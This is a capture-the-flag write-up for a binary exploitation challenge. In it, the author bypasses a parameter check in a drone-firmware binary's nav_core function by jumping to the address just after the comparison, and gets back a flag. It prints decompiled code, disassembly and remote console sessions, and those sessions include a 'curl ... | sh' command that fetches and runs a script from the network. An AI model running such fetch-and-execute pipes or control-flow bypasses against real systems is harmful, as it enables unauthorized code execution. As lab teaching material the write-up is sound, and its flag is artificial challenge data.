# Write-up of the challenge "KDNU-38"

This challenge is part of the **"Binary exploitation"** category and earns 110 points.

# Goal of the challenge

The goal of the challenge is to find a specific function to pass to the remote host that will be executed and return the flag. The difficulty is that the binary is very large, so searching through it would take ages if not done smartly.

## Solution

So I looked throught the functions in ghidra and found only one function that looked like it was written by a human since it had a name of **nav_core**. That's when I knew we gotta definetly pass that function, so I started off by sending that address.

```
pwndbg> info functions nav.core
All functions matching regular expression "nav.core":

Non-debugging symbols:
0x0000000000401955  nav_core
```

I got this in return:

```
nc ctf.csd.lol 1001
proof of work:
curl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.UndFpbWrZPzD07Hy3nMbqg==
solution: s.MDrD0tyxlNzZqNJ7agrDa3G1e1xzY1l9MTnTa6otug3SKkh8scv5lJpDmv/8HIHSEu2C4rxb8RD9ijNr5vi7bumnslNjurYrm04tF1nBjhbb3j7X4TZAM3u3E8HnMsLuBs6pO4bKJdcHeBlzQxU+bXtZQoBykGsPCsCXNXwNcxsD86y2Mku7ogjc6Ds5kBPYU4AXZEqBmNDm3MiYJ4T+vw==
DRONE FIRMWARE DEBUG CONSOLE> 0x0000000000401955
Invalid navigation token.
```

The decompiler of the function **nav_core** is:

```c

void nav_core(int param_1)

{
  int iVar1;
  long lVar2;
  long in_FS_OFFSET;
  undefined1 auStack_118 [264];
  long lStack_10;
  
  lStack_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 == 0xc0c0a) {
    iVar1 = open(&UNK_0049e030,0);
    if (iVar1 < 0) {
      puts(&UNK_0049e040);
    }
    else {
      lVar2 = read(iVar1,auStack_118,0xff);
      if (lVar2 < 1) {
        puts(&UNK_0049e060);
      }
      else {
        auStack_118[lVar2] = 0;
        write(1,auStack_118,lVar2);
      }
    }
  }
  else {
    puts(&UNK_0049e083);
  }
  if (lStack_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

The reason why we are failing is because we are not passing the param as **0xc0c0a**, as you can see in the decompiler above, so our short solution is just to **jump after check**. Which is at offset **+52**
```
pwndbg> disas 0x0000000000401955
Dump of assembler code for function nav_core:
   0x0000000000401955 <+0>:     endbr64
   0x0000000000401959 <+4>:     push   rbp
   0x000000000040195a <+5>:     mov    rbp,rsp
   0x000000000040195d <+8>:     sub    rsp,0x130
   0x0000000000401964 <+15>:    mov    DWORD PTR [rbp-0x124],edi
   0x000000000040196a <+21>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401973 <+30>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401977 <+34>:    xor    eax,eax
   0x0000000000401979 <+36>:    cmp    DWORD PTR [rbp-0x124],0xc0c0a
   0x0000000000401983 <+46>:    jne    0x401a31 <nav_core+220>
   0x0000000000401989 <+52>:    mov    esi,0x0
```

When I did that I got the flag in return:

```
nc ctf.csd.lol 1001
proof of work:
curl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.pf//zBZNXC0zcwUHGjyfRA==
solution: s.dvi97uaq7g3HF6v+5iBTkwi3FRzTmgiesdobsuTJ5f6P5M1BbHxEdY0d9wiDu4t//QDdzga8Hk3h8/BgahWwaFeGyiF7TVOmKzD9Y5MIFLsDG5DoFY9j+2UB/k/H3zJ640pDcfpSL0DWs1UR0rkwR4SDWlwce5KfDiWLk4uZSdCW3Ubv5jklukxXgfYNgZRa7a562ZpYNbKhZdepP/LsdQ==
DRONE FIRMWARE DEBUG CONSOLE> 0x0000000000401989
KDNU3B-MANIFEST
format_version=2
fw_family=KDNU-DRONE-NAV
fw_id=kdnu3b-nav-autopilot
fw_version=1.7.24
build_branch=krampus-prod
build_id=2024-12-01T23:41:09Z
signing_key_id=NP-HSM-KEY-07
region_lock=GLOBAL
min_bootloader=0x00020005
image_offset=0x00004000
image_size=00036F80
hash_algo=sha256
image_hash=5f4c3f7d8f0b2737c0f5fd8e8da41c6b9e1372cbe9c6760e5d8e9e4f3d7c9b21
telemetry_profile=KDNU3B-TM-v4
calibration_profile=csd{3Asy_F1rmWAr3_HACk1N9_Fr}
failsafe_mode=HARD_LOCKDOWN
debug_build=false
secure_boot=true
seal_status=SEALED
```